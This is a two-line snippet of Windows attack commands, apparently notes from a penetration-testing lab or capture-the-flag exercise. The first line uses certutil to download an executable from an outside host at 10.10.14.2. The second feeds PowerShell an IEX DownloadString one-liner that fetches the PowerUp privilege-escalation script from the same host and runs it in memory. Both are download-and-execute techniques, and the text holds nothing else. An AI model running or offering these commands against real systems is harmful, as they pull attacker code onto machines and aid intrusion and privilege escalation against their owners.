

certutil -urlcache -f  http://10.10.14.2/chimi.exe chimi.exe

echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1') | powershell -noprofile -